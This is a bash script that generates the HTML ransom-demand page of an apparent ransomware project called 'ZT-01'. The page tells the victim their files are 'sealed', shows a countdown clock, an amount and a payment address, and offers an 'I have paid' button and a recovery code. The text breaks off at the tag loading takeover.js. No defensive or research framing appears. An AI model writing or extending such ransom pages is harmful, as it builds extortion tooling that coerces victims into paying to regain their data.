#!/usr/bin/env bash
set -euo pipefail
cd "$(git rev-parse --show-toplevel)"

w(){ mkdir -p "$(dirname "$1")"; cat > "$1"; }

w portal/src/main/resources/static/takeover.html <<'EOF'
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>ZT-01 // Sealed</title>
  <link rel="stylesheet" href="/zt01.css">
  <style>
    body { display:grid; place-items:center; min-height:100vh; }
    main { max-width:640px; text-align:center; }
    .clock { font-size:72px; font-weight:700; letter-spacing:.04em; margin:18px 0 4px; }
    .hair { width:120px; height:2px; background:var(--accent); margin:0 auto 22px; }
  </style>
</head>
<body>
  <main>
    <div class="division">Project ZT-01 &middot; Operation Redacted</div>
    <h1>Files on this device are sealed.</h1>
    <div class="hair"></div>
    <div class="clock" id="clock">--:--:--</div>
    <div class="mute" id="caseId"></div>
    <div class="card" style="margin:26px 0;text-align:left">
      <dl>
        <dt>Amount</dt><dd class="big" id="amount">&mdash;</dd>
        <dt>Address</dt><dd><span class="addr" id="address">&mdash;</span></dd>
      </dl>
      <div class="row" style="margin-top:14px">
        <button id="copy">Copy address</button><button class="ghost" id="claim">I have paid</button>
      </div>
      <div class="error" id="error"></div>
      <div class="mute" id="state"></div>
    </div>
    <p class="mute">The recovery code restores the collection without any network access.</p>
  </main>
  <script src="/takeover.js">
